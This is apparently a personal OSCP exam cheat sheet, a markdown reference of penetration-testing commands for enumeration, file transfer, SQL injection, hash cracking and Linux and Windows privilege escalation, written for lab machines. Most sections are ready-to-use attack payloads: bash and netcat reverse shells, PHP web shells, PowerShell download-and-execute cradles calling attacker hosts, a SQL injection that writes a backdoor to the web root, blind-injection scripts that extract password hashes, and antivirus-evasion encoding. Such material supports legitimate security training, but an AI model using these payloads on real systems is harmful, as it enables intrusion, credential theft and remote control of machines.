# OSCP-Cheat-Sheet
Just Try Harder...
Perfect Practice Makes Perfect

## Reconnaissance and Enumeration
### Full TCP Scan
```
nmap -sC -sV -p- $RHOST | tee nmap$RHOST
```
### Top 1000 UDP Ports
```
sudo nmap -sU --top-ports 1000 $RHOST
```

### FTP - 21 TCP
```
ftp $RHOST
nc -vn $RHOST 21
```
To download ftp with wget: ```wget -m ftp://username:password@host``` or ```wget -r --no-passive ftp://username:password@host```

Check for anonymous login
Brute force login:
```
hydra -s $RPORT -C ./SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -u -f $RHOST ftp
```
https://book.hacktricks.xyz/pentesting/pentesting-ftp
https://steflan-security.com/?p=2075


### SMTP - 25 TCP
Might be able to enumerate usernames through SMTP.
```
nc $RHOST 25
[...]
VRFY root
VRFY jake
```

### DNS - 53 TCP/UDP
If port 53 is on TCP -> check for Zone Transfer
```
host -l <domain name> <name server>
dig axfr <domain name> @<name server>
eg: dig axfr friendzone.red @10.10.10.123
```

### RPC/NFS - 111
Enumerate RPC first:
```
nmap -sV -p 111 --script=rpcinfo $RHOST
```
If found NFS-related services, enumerate those.
```
nmap -p 111 --script="nfs*" $RHOST
```
If NFS shares found, mount them and try to read/write or change permission by adding a new user with a certain UID.
```
mount -t nfs -o vers=3 $RHOST:/SHARENAME /mnt

groupadd --gid 1337 pwn
useradd --uid 1337 -g pwn pwn
```

### SMB 139/445 TCP
Check for 'null-session' - anonymous login.
Check for potential vulnerablity (Eternal Blue)

Enumerate Hostname
```
nmblookup -A $RHOST
```

List Shares
```
smbmap -H $RHOST
smbmap -u anonymous -p anonymous -H $RHOST


smbclient -L \\\\$RHOST
nmap --script smb-enum-shares -p 139,445 $RHOST
```

Check Null Sessions
```
rpcclient -U "" -N $RHOST
-U "" :null session
-N    :no password
```

Connect to Shares
```
smbclient \\\\$RHOST\\<Sharename>
```
Connect to Share with credentials
```
smbclient \\\\$RHOST\\<Sharename> -U=username%'password'
```

Mount the share locally
```
sudo mount -t cifs//$RHOST/$SHARENAME ./smbShare
```

To unmount
```
sudo umount -l ./smbShare
```

Remote download share
```
smbget -R smb://$RHOST/$SHARENAME
```

Can attempt to connect with blank password

Overall Scan
```
enum4linux -a $RHOST
```
https://book.hacktricks.xyz/pentesting/pentesting-smb


### SNMP - 161/UDP
```
snmp-check $RHOST
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $RHOST
snmpwalk -v2c -c public $RHOST
```
https://book.hacktricks.xyz/pentesting/pentesting-snmp


### Redis - 6379

Gain RCE via SSH: https://m0053sec.wordpress.com/2020/02/13/redis-remote-code-execution-rce/
Other vectors: https://book.hacktricks.xyz/pentesting/6379-pentesting-redis


### HTTP directory brute force with Gobuster
```
gobuster dir -w ./SecLists/Discovery/Web-Content/raft-medium-words.txt -x <file extension> -u $RHOST
```
or with dirsearch
```
dirsearch -w ./SecLists/Discovery/Web-Content/raft-medium-words.txt -e <file extension> -u $RHOST
```
Common file extension for Linux: php,html,js,sh,txt,jsp,pl\
Common file extension for Windows: php,asp,js,html,text,aspx,bak\
-k can be added to bypass TLS

### DNS sub-domain brute force with Gobuster
```
gobuster vhost -w ./SecLists/Discovery/DNS/subdomains-top1million-10000.txt -u $HOSTNAME
```

### Nikto Scan
For easy wins or low-hanging fruit (less likely)
```
nikto -h $RHOST
```

### WordPress Enum with wpscan
```
wpscan --url $RHOST -e vt,tt,u,ap
```

### Tomcat Apache server
If the server is running Apache Tomcat (check for version obviously)\
Always check for ```/admin```, ```/manager``` and ```/manager/html``` to see if we can upload and deploy ```.war``` files.


## Shell Upgrading
```
python -c "import pty;pty.spawn('/bin/bash')"
^Z
stty echo -raw;fg
reset/enter
export TERM=xterm
```

## Transfer Files
### using Python http server
```
python3 -m http.server 8888
```
To get file:
```
curl $LHOST:8888/file -o outfile
wget $LHOST:8888/file
```
### Using netcat
```
nc -w 3 $RHOST 8888 < outfile
```
To get file
```
nc -lp 8888 > outfile
```
### Windows Powershell
```powershell (New-Object Net.WebClient).DownloadFile('$LHOST/file', '$PATH\outfile')``` <- download file to disk\
```powershell "IEX(New-Object Net.WebClient).downloadString('$LHOST/file')"``` <- download and exec on memory\
```powershell "IEX( IWR $LHOST/$FILE -UseBasicParsing)"``` <- download and exec on memory

### Certutil
```
certutil.exe -urlcache -split -f "$RHOST:$RPORT/file" outfile.zip
```

### curl
```
curl $RHOST -o outfile
```

### When everything else fails on Linux, no nc, no python, no scp
On remote host:
```
cat file > /dev/tcp/$LHOST/$LPORT
```

On local host:
```
nc -lvnp $LPORT > file
```

### Between Kali VM and Windows VM
On kali box: ```sudo impacket-smbserver -smb2support SHARENAME $(pwd)```\
On Windows box: Run ```\\Kali's IP (Not VPN)\SHARENAME```\

### From Windows to local Kali machine using impacket-smbserver
On local Kali machine:
```
sudo impacket-smbserver ShareName $(pwd)
```
Connect to newly created Share from Remote Windows target:
```
net use \\$LHOST\ShareName
```
Once connected to Share
```
copy $FILEPATH\file \\$LOST\ShareName
```
File should be copied from remote Windows target to local Kali machine at $(pwd)

### From local Kali to remote Windows target using impacket-smbserver
On local Kali machine:
```
sudo impacket-smbserver ShareName $(pwd)
```
Copy files from local Kali machine to remote Windows target
```
robocopy \\<IP>\$SHARENAME\$FILENAME .
```


Trick: if accquired a webshell, aka have code exec, however, powershell commands don't seem to work and the target machine doesn't have nc. You can upload nc.exe via creating a SMB Share.\
On local kali machine, create an SMB share pointing to current directory:
```
sudo impacket-smbserver ShareName $(pwd)
```

Connect and run the executable via the newly create SMB Share:
```
....php?cmd=\\$LHOST\$SHARENAME\nc.exe -e cmd.exe $LHOST $LPORT
....php?cmd=\\10.10.14.67\Jake\nc.exe -e cmd.exe 10.10.14.67 9000
```


## Simple PHP web shell
```
<?php system($_REQUEST['cmd']); ?>
xxx.php?cmd=whoami
```
or
```
<?php echo shell_exec($_REQUEST["cmd"]); ?>
```

##  Reverse Shell
### PHP
```
<?php
exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'");
```

### Bash
```
/bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
```

### Netcat
```
nc $LHOST $LPORT -e /bin/bash
```

### Netcat Windows
```
nc.exe $LHOST $LPORT -e cmd.exe
```
https://weibell.github.io/reverse-shell-generator/ \
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md


## Connect to MS SQL Database
From local Kali machine:
```mssqlclient.py $USERNAME:'$PASSWORD'@$RHOST -windows-auth```

If xp_cmdshell is enabled, we can create a reverse shell session right away: ```xp_cmdshell powershell "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.4:6666/shell.ps1\")"```

If shell.ps1 is blocked by AV, try with based64 encoding ```echo "powershell_payload" | iconv -t utf-16le | base64 -w 0```\
Run with powershell /enc\
Or just find a different powershell TCP payload.

## Capture Windows Auth Hash via Responder (while on a MS SQL console)
From local Kali machine, set up a smbserver:
```sudo impacket-smbserver $SHARENAME $(pwd)```\
From local Kali machine, set up a Responder listener:
```sudo responder -I tun0```\
From the MSSQL console:
```xp_dirtree "\\$LHOST\$SHARENAME"``` to connect and list the dir tree of the remote SMB Share

The responder listener will capture the NTMLv2 hash of the Windows target machine with this request -> can possibly crack this hash with ```john``` or ```hashcat```


## Crack Windows Auth Hash
### LM Hash:
```john --format=lm --wordlist=rockyou.txt hash.txt```\
```hashcat-m 3000 -a 3 hash.txt rockyou.txt```

### NT Hash:
```john --format=nt --wordlist=rockyou.txt hash.txt```\
```hashcat -m 1000 -a 3 hash.txt rockyou.txt```

### NTLMv1:
```john --format=netntlm --wordlist=rockyou.txt hash.txt```\
```hashcat -m 5500 -a 3 hash.txt rockyou.txt```

### NTLMv2:
```john --format=netntlmv2 --wordlist=rockyou.txt hash.txt```\
```hashcat -m 5600 -a 3 hash.txt```

## File Inclusion:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md


## SQL Injection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
https://portswigger.net/web-security/sql-injection/cheat-sheet

Simple SQL Injection Log In bypass
Try a lot of them out:
```
' or '1'='1'-- -
' or 1=1 -- -
' or 1=1#
admin' -- -
admin' #
```

Check number of column:
When SQLi is possible, if n+1 does not return anything, n is the number of column in the table
```
php?xxx=1 order by n
```

Dump MySQL DB:
```
mysqldump -u username -p DBname > dump.sql
```

Check for maths operation:
```
php?xxx=1 + 1
```

### Union/Error based SQL attack:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-union-based
https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/Error%20Based%20SQLi

Sample payloads:
```
php?xxx=9999999 union select 1,2,3,4,5,n
```
Or
```
php?xxx=9999999' union select null,null,null,null,null,n
```

With n is the correct column amount, the page should populate results again, database() and user() can be replaced to reveal information about the database. Null is used because the value type returned from the injected SELECT query must be compatible between the original and the injected queries (NULL is convertible to every commonly used data type).

Use group_concat() to display output of user(), database() and @@version in 1 line separate by “::”
```
php?xxx=9999999 union select 1,group_concat(user(),”::”,database(),”::”,@@version),3,4,5
```

Show database version with UNION:
```
http://192.168.160.10/debug.php?id=1 union select all 1,2,@@version
```

Show tables in database with UNION:
```
http://192.168.160.10/debug.php?id=1 union select all 1,2,table_name FROM information_schema.tables wWHERE table_schema='$DB_NAME'
```

To extract different table names from a database:
```
http://192.168.160.10/debug.php?id=1 union select all 1,2,table_name FROM information_schema.tables WHERE table_schema='$DB_NAME' and table_name!='$TABLE1_NAME'
```

Show all columns from the table “users” in the database with UNION:
```
http://192.168.160.10/debug.php?id=1 union select all 1,2,column_name from information_schema.columns where table_name=’users’
```

Use load_file() function to cat a file through SQLi:
```
php?xxx=9999999 union select 1,load_file(‘/etc/passwd’),3,4,5
```

Use into OUTFILE to write to a file with UNION:
```
http://192.168.160.10/debug.php?id=1 union select all 1,2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```
This writes a php backdoor into the web server root directory, from then we can achieve code exec with:
```
http://192.168.160.10/backdoor.php?cmd=nc.exe 192.168.119.160 8888 -e cmd.exe
```

Show hostname, user, hashed password of a database from union SQLi:
```
php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mysql.user),3,4,5,6,7
```

### MSSQL Injection (error based):
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MSSQL%20-%20Error%20Based%20SQLi

Check for database version: @@version, user: user_name() and: db_name() name with:
```
and 1 in (select db_name())
```
db_name() can be iterate with db_name(0), db_name(1), etc. to show different databases.

Check for table names in a database:
```
and 1 IN (select top 1 cast(name as varchar(4096)) from $DB_NAME..sysobjects where xtype = 'U')
```
Check for other table names:
```
and 1 IN (select top 1 cast(name as varchar(4096)) from $DB_NAME..sysobjects where xtype = 'U' and name not in ('$TABLE_NAME'))
```

Check for column names in a table:
```
and 1 IN (select top 1 cast($DB_NAME..syscolumns.name as varchar(4096)) from $DB_NAME..syscolumns, $DB_NAME..sysobjects where $DB_NAME..syscolumns.id=$DB_NAME..sysobjects.id and $DB_NAME..sysobjects.name='$TABLE_NAME')
```
(wtf right?)

OR
```
and 1 IN (select top 1 column_name from information_schema.columns where TABLE_NAME=cast(0x636c75625f6d656d62657273 as varchar))
```
where the 0x part is table name in hex.

Check for the next column in a table:
```
and 1 IN (select top 1 cast($DB_NAME..syscolumns.name as varchar(4096)) from $DB_NAME..syscolumns, $DB_NAME..sysobjects where $DB_NAME..syscolumns.id=$DB_NAME..sysobjects.id and $DB_NAME..sysobjects.name='$TABLE_NAME' and $DB_NAME..syscolumns.name NOT IN ('$COLUMN_NAME'))
```
OR like
```
and 1 IN (select top 1 column_name from information_schema.columns where TABLE_NAME=cast(0x636c75625f6d656d62657273 as varchar)and column_name NOT IN ('id','name','username'))
```
-> this should print out the next column.

Extract the username and password pair from a table:
```
or 1 IN (select top 1 cast(username%2b':::'%2bpassword as varchar(4096)) from $DB_NAME..$TABLE_NAME)
```
where %2b is for string concat, and ':::' is just a seperator.

Extract an username from a table:
```
and 1 IN (select username from $TABLE_NAME)
```
or another user:
```
and 1 IN (select username from $TABLE_NAME where username!='$USERNAME')
``` 

Or just extract the password if the username and table name is known:
```
and 1 IN (select top 1 password from $TABLE_NAME where name='$USERNAME')
```



### Blind/Boolean based SQL Injection:
Read more: https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MySQL%20-%20Boolean%20Based%20Blind%20SQLi#mysql-boolean-based-blind-sql-injection-cheatsheet

Example from the machine Help from HTB:
```&param[]=6 and (length(database())) = 7-- -```
returns the site properly:
database name length has 7 characters

looking at the source code of helpdeskZ
table name we're looking for is likely to be 'staff'

check if username of 'staff' table is 'admin'

```&param[]=6 and ((select username from staff limit 0,1 )) = 'admin'-- -```
returns the site properly -> username is admin

Try and check for length of password (hashed)
md5: 32 characters
sha1: 40 characters
sha256: 64 characters

```&param[]=6 and (length((select password from staff limit 0,1 ))) = 32-- -```
does not return site properly -> not 32

```&param[]=6 and (length((select password from staff limit 0,1 ))) = 40-- -```
returns site properly -> password hash is sha1

check if first character of the password hash is 'a'
```&param[]=6 and (substr((select password from staff limit 0,1 ),1,1)) = 'a'-- -```\
iterate a->f 0->9 until request returns site properly

check for second character:
```&param[]=6 and (substr((select password from staff limit 0,1 ),2,1)) = 'a'-- -```
```
import requests

url = "http://10.10.10.121/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6"
cookies = {'lang':'english', 'PHPSESSID':'rq7j4ve8pslipe4fleouu1v8i1', 'usrhash':'0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF/aNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo+EGN+qolsK/yi5VISf+McPtEbfqB02DLW0eQV29VGXE0g=='}
characters = 'abcdef0123456789'
hashedPW = ""

for i in range (1,41):
        for j in characters:
                payload = f" and (substr((select password from staff limit 0,1 ),{i},1)) = '{j}'-- -"
                r = requests.get(url+payload, cookies = cookies)
                if (r.headers['Content-Type'] == 'text/plain;charset=UTF-8'):
                        print(f"Hash character found: {j}")
                        hashedPW += j
                        print(hashedPW)                     
```

Check for the first character of the database name: ```' and substr(database(),1,1)='a' -- - ``` \
Check for the second character of the database name: ```' and substr(database(),2,1)='a' -- - ``` \
Simple script to automate database name retrieval: (Blind SQL Injection eWPTv1 lab): \
```
#! /usr/bin/python3
import requests

url = "http://1.lab.sqli.site/getBrowserInfo.php"
chars = "abcdefghijklmnopqrstuvwxyz0123456789_-!"
dbName = ""

for index in range (1,16): # DB name 15 characters long
	for each in chars:
		payload = f"' AND substr(database(),{index},1)='{each}'-- -"
		headers = {
			'User-Agent': payload
			}
		r = requests.get(url, headers = headers)
		if (len(r.text) == 16):
			dbName += each
			print(f"Character matched! {each}")
			break
		else:
			print("Testing next character: " + dbName + each + '*' )
print(f"Database name: {dbName}")
```

Check for how many table there are in the database: ```' and (select count(*) from information_schema.tables where table_schema='$DBNAME') = 4 -- - ``` \
Check for the length of the first table: ```' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 7 -- - ``` \
Check for the length of the second table: ```' and (length((select table_name from information_schema.tables where table_schema=database() limit 2,1))) = 7 -- - ``` \
Check for the first letter of the first table: ```' and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) = 'p' -- -``` \
Check for the second letter of the first table: ```' and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)) = 'r' -- -``` 


## Serilisation/Deserialisation Exploit

### Tomcat Apache Deserialisation attack (CVE 2020-9484) with ```ysoserial``` to generate payload
WIP

### PHP Deserialisation attack
WIP

## Post Exploitation
Check for current running processes:
```
ps aux
```

Check for conf file of a running software/service in: ```/etc/<service>/*.conf```

Check for current network connections:
```
ss -lntp
```
Check for interesting files:
ssh keys, logs file (if got permission), /etc/passwd, /opt, cronjob

## Chaining commands:
If we can run certain commands on the server, check if we can chain commands
```
;ls
&pwd
;bash -c 'bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1'
```


## Some notes:

Some file extensions that can potentially bypass extension check:
PHP: phtml, php3, php4, php5, .inc
ASP: aspx
PERL: pl, .cgi, .lib
JSP: jspx, jsw, jsv, jspf


On Windows machines, files can be hidden on different data streams ($DATA and $INDEX_LOCATION), reveal with ```dir /r``` and show content with more < $FILENAME:STREAM\
With PowerShell: ```Get-Iteam -path %PATH%  -stream * ```\
Search for Alternate Data Stream (ADS) with PowerShell: ```gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'```\
In SMB Client: ```allinfo <FILENAME>``` -> output:\
```stream: [::$DATA], 0 bytes```\
```stream: [:Password:$DATA], 15 bytes```\
```get "FILE:Password:$DATA"```

Connect to **Microsoft SQL Database** from local Kali machine with ```mssqlclient.py``` from python-impacket 

Run sudo command as another user:
```
sudo -H -u username
```

Find all SUID files:
```
find / -perm /4000 -exec ls -l {} \; 2>/dev/null
```
Find all files owned by an user:
```
find / -username -exec ls -l {} \; 2>/dev/null
```

### Inject commands without white spaces:
**Using bash brace expansion**\
```{echo,hello,world}``` equals ```echo hello world```\
**Using env variable with encoded spaces**\
```CMD=$'\x20hello\x20wolrd';echo$CMD``` equals ```echo hello world``` with ```\x20``` is hex code for white space


### Hashcat:
Use hashcat rule to generate a list of variation of a common word:
```
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout phrase.txt > variation.txt
```
To crack:
```
hashcat -m (mode) -a 0 hashdump plaintext
```
```
hashcat -m hash.txt rockyou.txt
```
Crack md5 hash:
```
hashcat -m 0 hash.txt rockyou.txt
```

### Decrypt encrypted SSH Key:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
```
Crack with john using ssh2john.py module:
```
python ssh2john.py ssh.key > key.key
```
Then use john to brute force the SSH key phrase: (requires john 1.9 Jumbo)
```
john --wordlist=rockyou.txt key.key
```

### Decrypt a .kdbx (KeePass file)
Crack with keepass2john.py module
```
python keypass2john.py ceh.kdbx > hash.txt
```
Then use john to brute force the Hash: (requires john 1.9 Jumbo)
```
john --wordlist=rockyou.txt hash.txt
```


### Spoof a file signature
Spoof a php file with a png image
Grab PNG magic bytes (first 64 bytes)
```
head -c 64 image.png > sig
```
Create new PHP file with PNG signature
```
cat sig shell.php > newshell.php
```
Upload and modify POST request with Burp


## Pivoting
https://sushant747.gitbooks.io/total-oscp-guide/content/port_forwarding_and_tunneling.html
https://github.com/21y4d/Notes/blob/master/Pivoting.txt
 
## Breaking out of a Restricted Shell:
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
Also
```ssh -i key.pem user@$RHOST -t bash --noprofile```

## Crackmapexec:
```crackmapexec smb $RHOST -u $USERNAME -p $PASSWORD --continue-on-success ```: brute force smb\
Can replace $USERNAME with list of users\
Support multiple modules such as smb, winrm, ssh, mssql\
Can append ```-X $command``` to execute command with a successful hit


## Linux Privilege Escalation/Post Exploitation

Check for hidden files

Check for current Environment Variables

Check for unprotected SSH private key, or can we add our public key to authorized_keys

Check ```sudo -l``` for things that can be run privileges, with or without password (if LD_PRELOAD, LD_LIBRARY_PATH env variables are listed) 

Check for bash version (bash < 4.2-048 is possible to define user functions with absolute path name, which take precedence over any other path; if bash version is < 4.4, can change the SHELLOPTS=xtrace and the $PS4 would be running as root).

Look for any suspicious files in common places (```/home``` or ```/var/www/html```)

Check ```id```

Auto enumerate with ```linPEAS.sh```

Check current running processes that are owned by root with: ```ps aux | grep root```

Check if we're inside a Docker container, to break out out of a Docker container:
https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout

Check for services running/listening locally ```ss -lntp```

Check for cronjobs and cronjob logs:
Member of (adm) group can read log files
  Cron logs are stored at: /var/log/cron.log*
  Cronjob entries are stored at: /var/log/syslog

Check for unusual SUID binaries, investigate further with: https://gtfobins.github.io/
Run ```strace``` ```ltrace``` for detailed analysis of the binaries
Unpack with Ghidra

Check for installed applications, their versions, any known exploits?

With any fishy or suspicious running services, Google for potential priv-es vectors

Check for any root owned files that are writable

Check for history files (.bash_history, php_history...)\
Check if /etc/passwd, .bashrc, are writable, check if /etc/shadow is readable

Check for writable libraries for potential library import hijack (eg: in Python, import os, check if os library is writable)

Check for file path (relative vs absolute path) --> potential path hijack

Check for config files (.conf), potential database password in .conf files, writable .conf files?

Check for readable backup files (/root, /tmp, /var/backups, etc.)

If tmux is installed, check for any shell session that we can hijack
```
tmux ls; tmux attach -t tmuxname; screen -ls; screen-dr sessionname; byobu list-session;
```

If NFS is open, check for NFS shares and mount them

```showmount -e $RHOST; sudo mount -o rw,vers=2 $RHOST:$SHAREDFOLDER /tmp/NFS``` \
On local Kali machine, as root, generate an exec payload ```msfvenom -p linux/x86/exec -f elf CMD="/bin/bash -p" > shell.elf``` \
Set permission bits: ```chmod +xs /tmp/NFS/shell.elf``` \
Run the payload on target machine => root acquired


**Check for any Linux capabilities (e.g: set_uid capabilities):** \
E.g: openssl capablities: \
https://www.bytefellow.com/linux-privilege-escalation-cheatsheet-for-oscp/#ftoc-exploiting-openssl-capability

Last resort: Kernel Exploit! Check with linPEAS output or ```uname -a``` (<4.8.3)\
If DirtyCow doesn't work, try googling with the specific kernel version.

https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation \
https://in.security/lin-security-walkthrough/ \
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ \
https://steflan-security.com/?p=283 \
https://book.hacktricks.xyz/linux-unix/privilege-escalation


## Windows Privilege Escaltion/Post Exploitation

**Check permission with** ```whoami /all```

**Execute command under another user with stored credentials:** ```runas /user:$USERNAME /savecred "$COMMAND HERE"```

**Check general host information with** ```systeminfo; net users; net localgroups; netstat -ano; ipconfig /all; tasklist```

**Check C:\Users\$USER\AppData folder**

**Auto enumerate with (enum script of choice here:)** ```winPEAS.exe```

**If the payload is blocked by Defender, besides trying to encode and obfuscate it, consider try a custom one and re-compile the executable**

**Check loaded libraries --> potential DLL hijacking <-- need to restart the service/reboot the machine**

**Execute command remotely on Remote Windows target via SMB Creds with winexe or psexec.py from Local Kali machine**
```
winexe -U 'user%password' //$RHOST powershell.exe
winexe -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 powershell.exe
```
```
impacket-psexec $USERNAME:'$PASSWORD'@$RHOST powershell
```

**Bypass Group Policy App Block - Applocker**\
https://github.com/api0cradle/UltimateAppLockerByPassList


**If WinRM (Windows Remote Management) is open, use evil-winrm with creds to gain access**\
```ruby /opt/evil-winrm/evil-winrm.rb -i 10.10.10.27 -u administrator -p '$PASSWORD'```

**If NTLM hash is accquired -> can perform Pass The Hash attack with path-winexe**
```
pth-winexe -U user%<LM Hash>:<NT Hash> //$RHOST cmd
```

**Encode and run encoded powershell command:**\
Encode: ```echo "IEX( IWR http://10.10.14.x:6969/kaboom.exe -UseBasicParsing)" | iconv -t utf-16le | base64 -w 0``` \
Run encoded command: ```powershell -EncodedCommand $B64_ENCODED_COMMAND```

**To view Access Control List of a directory:**
```Get-ACL $FILEPATH | fl *```

**Can set ACL with:**
```icacls "$PATH" /grant $USER:F /T```

**Service Commands** \
Query the configuration of a service: ```sc.exe qc <service name>``` \
Query the current status of a service: ```sc.exe query <service name>``` \
Modify a configuration option of a service: ```sc.exe config <service name> <option>= <value> ``` \
Start/Stop a service: ```net start/top <service name>``` \

For services running as SYSTEM, check for weak service permissions (ACL) using ```accesschk.exe``` within Sysinternals: ```accesschk /accepteula -uwcqv user <service name> ``` \
SERVICE_STOP, SERVICE_START => allow us to start/stop the service\
SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS => allow us to modify the service config

If we can change the config of a service with SYSTEM priv, we can change the executable of the service to use our custom executable. HOWEVER, we need the permission to start/stop the service. \
Change the config path of a service, point it to the reverse shell payload: ```sc.exe config <service name> binPath= "\"C:\Users\Public\rev.exe\"" ```, set up a listener and restart the service.


**Check for unquoted service path:** \
If an unquoted path service is spotted: ```C:\Program Files\Unquoted Path Service\Common Files\thisservice.exe``` \
Check access on ```C:\```, ```C:\Program Files```, ```C:\Program Files\Unquoted Path Service```, ```C:\Program Files\Unquoted Path Service\Common Files``` with ```accesschk``` \
```accesschk /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"``` \
![image](https://user-images.githubusercontent.com/20218092/125386701-d62f1c80-e3f0-11eb-992b-e0e0ef94ba11.png)

Showing we have RW access to ```C:\Program Files\Unquoted Path Service\``` \
Write a payload called ```Common.exe``` \
When the service is restarted, ```Commom.exe``` will be executed.


**Check for PowerShell history and Transscript**
Credentials or information might be hidden in PowerShell history or PSTranscript files\
Registry query for PowerShell transcritp:```gci -Path 'HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\Transcription'```


**Check for Weak Registry permission:** \
Windows registry contains entries for services and have ACL. If the registry ACL can be configured => privilege escalation vector. \
Verify permission with Get-ACL or icacls or accesschk. \
NT AUTHORITY/INTERACTIVE GROUP = all local logged on users \
Inspect the ImagePath with ```reg query``` command \
Modify the ImagePath with ```reg add <original imagepath> \v ImagePath \t REG_EXPAND_SZ \d <new path to payload> \f ``` => restart the service. \

**DLL Hijack** \
If a DLL is loaded with an absolute path by a service with SYSTEM privilege => potential privilege escalation vector if the DLL is writable. \
Monitor a process with ProcMon to see what DLLs are loaded by the process at run-time, look for missing DLLs for any DLL that are writable. \
Replace or add a custom DLL (generated with msfvenom) in the location (if writable) => restart the service. \


**Check for Auto run program** \
See if the exe and path is writable -> replace the exe with our payload. \

**Check for AlwaysInstallElevated** \
If AlwaysInstallElevated is detected, and both HKLM(HKCU)\SOFTWARE\Policies\Microsoft\Windows\Installer is set to 1: \
We can craft a .msi payload and install it on the target Windows machine with SYSTEM privilege. \

**Query for password in registry hive** \
Check if the password is saved anywhere within the HKLM or HKCU hive: \
```reg query HKCU /f password /t REG_SZ /s ``` \
```reg query HKLM /f password /t REG_SZ /s``` 

**Check for saved credentials** \
If saved creds is found during enum -> ```runas /savecred /user:$USERNAME "$COMMAND"``` to run the command under the saved cred's privilege level. 


**Check if SAM and SYSTEM registry hive are accessible** \
If SAM and SYSTEM reg hive are accessible at C:\Windows\System32\config -> can extract the usernames and hashes with secretdump.py \
Backups of these might be in C:\Windows\Repair or C:\Windows\System32\config\RegBack \
If we can grab ntds.dit file => we can dump the whole AD database as well.


**Check for any current scheduled task** \
Check for any current scheduled tasks: ```schtasks /query /fo LIST /v ``` \
Or ```Get-ScheduledTask | ft TaskName,TaskPath,State``` \
Users cannot see tasks being run by other users with high priv, so we need to enumerate to find any scripts or tasks that are being run as SYSTEM and.
If the task/script target has weak permission -> we can exploit this.


**If autologon credential is captured. We can try to log in as admin:**

```$newPass = ConvertTo-SecureString '$FOUNDPASSWORD' -AsPlainText -Force```

```$newCred = New-Object System.Management.Automation.PSCredential('Administrator', $newPass)```

Set up a new listener on local Kali, and get a new PowerShell session from remote Windows machine with:

```Start-Process -FilePath “powershell” -argumentlist “IEX(New-Object Net.WebClient).downloadString(‘$LHOST/shell.ps1’)” -Credential $newCred```


**Privilege Escalate by abusing Access Token** with ```whoami /priv```

What is Access Token: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/access-tokens

Check if any of these access tokens are enabled:

SeImpersonatePrivilege: can be exploited with rottenpotato, juicypotato\
SeAssignPrimaryPrivilege: can be exploited rottenpotato, juicypotato\
SeBackupPrivilege: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens\
etc. \
SeRestorePrivilege: grants write access to all objects on the system -> modify service binaries, overwrite DLLs used by SYSTEM processes, modify registry settings.\
SeTakeOwnershipPrivilege: allows user to take ownership over an object (WRITE_OWNER permission). Once owned -> we can modify its ACL and grant us write access -> same as SeRestorePrivilege.\
JuicyPotato won't work with Windows 10 1809 and Windows Server 2019 and above. Try **Rogue Potato** instead: \
Transfer RoguePotato.exe over the target machine. \
On local machine: 
```
socat tcp-listen:135,reuseaddr,fork tcp:$RHOST:$RPORT
```
Set up a Python server to transfer powershell payload over and a netcat listner. \
On target machine: 
```
.\RoguePotato.exe -r 10.10.14.x -e "powershell -c IEX( IWR http://10.10.14.x:6666/rev.ps1 -UseBasicParsing)" -l 9000
```
The port '9000' has to be open on the target, or we can use Chisel to open and tunnel it. Watch Worker@HTB writeup.


**Port forwarding for privilege escalation**

If a service is listening locally only, or the firewall blocks a specific incoming port.\
We can port forward with plink.exe\
```plink.exe root@$LHOST -R  8080:127.0.0.1:8080```: forward a remote port to a local port, the first 8080 is the port on kali, second 8080 is the victim's port to forward to.\
Make sure Kali's SSH can be accessed with root.\
Now, 8080 on Kali is being forwarded to the target's 8080 over the SSH connection.\
https://github.com/backlion/Offensive-Security-OSCP-Cheatsheets/blob/master/offensive-security/ssh-tunnelling-port-forwarding.md


If Windows 7 is detected, check for potential Eternal Blue or Kernel Exploit.

https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#privilege-escalation
https://butter0verflow.github.io/oscp/OSCP-WindowsPrivEsc-Part1/
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
